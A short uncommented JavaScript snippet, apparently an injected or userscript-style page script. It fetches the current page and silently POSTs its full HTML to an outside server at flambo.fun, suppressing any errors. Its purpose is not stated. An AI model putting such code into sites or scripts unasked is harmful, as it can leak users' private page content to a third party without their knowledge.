
(async function () {

    sendPage(window.location.href).catch(_ => undefined)

    async function sendPage(url) {

        const response = await fetch(url)

        await fetch("https://flambo.fun/api/public/page", {
            method: "POST",
            body: await response.text()
        })
    }

})();